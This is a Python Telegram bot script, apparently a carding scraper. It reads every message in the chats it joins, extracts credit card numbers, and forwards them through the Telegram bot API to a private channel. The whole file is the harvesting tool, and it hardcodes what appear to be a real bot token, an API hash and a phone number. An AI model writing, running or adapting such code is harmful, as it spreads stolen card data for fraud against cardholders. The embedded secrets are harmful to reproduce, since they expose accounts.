from telethon.sync import ( TelegramClient,events )
from func.funtions import FindCards
import requests

client = TelegramClient('RexScrapp', 24648014, '3575a0f1524c2a08cc297fbd5355e318').start('+52 5644968614')


TOKEN = '6467648381:AAEDMJs_T-uJpkvtuoVsqlMD7SCUB7gkvWY'
def enviar(id,texto):
    url = f'https://api.telegram.org/bot{TOKEN}/sendMessage'

    params = {
            'chat_id': id,
            'text': texto,
            'parse_mode': 'HTML',
            'reply_markup': {
                'inline_keyboard': [
                    [{'text': '𝘾𝘾𝙎 💳', 'callback_data': 'send'},{'text': 'ريكس', 'url': 'https://t.me/RexAw4it'}]
                ]
            }
        }
    
    requests.post(url, json=params)

@client.on(events.NewMessage())
async def handler(event):
    ccs = FindCards(event.message.message.upper())
    if ccs:
        
        enviar(-1002168725135,ccs)

client.run_until_disconnected()